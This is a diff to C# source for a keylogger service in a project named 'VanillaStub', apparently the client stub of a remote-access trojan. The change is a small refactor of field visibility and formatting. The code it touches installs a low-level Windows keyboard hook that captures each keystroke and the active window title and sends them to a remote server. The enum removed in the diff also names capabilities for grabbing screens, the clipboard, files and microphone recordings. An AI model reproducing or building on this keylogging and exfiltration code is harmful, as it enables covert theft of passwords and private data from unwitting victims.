@@ -4,6 +4,7 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Windows.Forms;
+using System.Windows.Forms.VisualStyles;
 
 namespace VanillaStub.Helpers.Services
 {
@@ -11,34 +12,12 @@ namespace VanillaStub.Helpers.Services
     {
         public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
-        public const int WH_KEYBOARD_LL = 13;
-        public const int WM_KEYDOWN = 0x0100;
-        public static LowLevelKeyboardProc Proc = HookCallback;
-        public static IntPtr HookID = IntPtr.Zero;
-        public static string CurrentWindow = "";
-        public static bool SendKeys { get; set; }
-
-        //Data type enum
-        public enum DataType
-        {
-            ImageType = 0,
-            NotificationType = 1,
-            ClientTag = 2,
-            ProcessType = 3,
-            InformationType = 4,
-            FilesListType = 5,
-            CurrentDirectoryType = 6,
-            DirectoryUpType = 7,
-            FileType = 8,
-            ClipboardType = 9,
-            HardwareUsageType = 10,
-            KeystrokeType = 11,
-            CurrentWindowType = 12,
-            MicrophoneRecordingType = 13,
-            AntiVirusTag = 14,
-            WindowsVersionTag = 15,
-            MessageType = 16
-        }
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+        private static LowLevelKeyboardProc Proc = HookCallback;
+        private static IntPtr HookID = IntPtr.Zero;
+        private static string CurrentWindow = "";
+        public static bool SendKeys { private get; set; }
 
         public void InitKeylogger()
         {
@@ -49,9 +28,7 @@ namespace VanillaStub.Helpers.Services
                 Application.Run(MessageLoop);
                 UnhookWindowsHookEx(HookID);
             }
-            catch
-            {
-            }
+            catch { }
         }
 
         public IntPtr SetHook(LowLevelKeyboardProc Proc)
@@ -67,24 +44,25 @@ namespace VanillaStub.Helpers.Services
         {
             try
             {
-                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+                if (nCode >= 0 && wParam == (IntPtr) WM_KEYDOWN)
                 {
                     int vkCode = Marshal.ReadInt32(lParam);
                     if (SendKeys)
                     {
                         List<byte> ToSend = new List<byte>();
-                        ToSend.Add((int)DataType.KeystrokeType);
-                        ToSend.AddRange(Encoding.ASCII.GetBytes(((Keys)vkCode).ToString()));
+                        ToSend.Add((int) DataType.KeystrokeType);
+                        ToSend.AddRange(Encoding.ASCII.GetBytes(((Keys) vkCode).ToString()));
                         Networking.Networking.MainClient.Send(ToSend.ToArray());
                         ToSend.Clear();
                         CurrentWindow = GetWindowName();
-                        ToSend.Add((int)DataType.CurrentWindowType);
+                        ToSend.Add((int) DataType.CurrentWindowType);
                         ToSend.AddRange(Encoding.ASCII.GetBytes(CurrentWindow));
                         Networking.Networking.MainClient.Send(ToSend.ToArray());
                     }
                 }
             }
             catch { }
+
             return CallNextHookEx(HookID, nCode, wParam, lParam);
         }
 
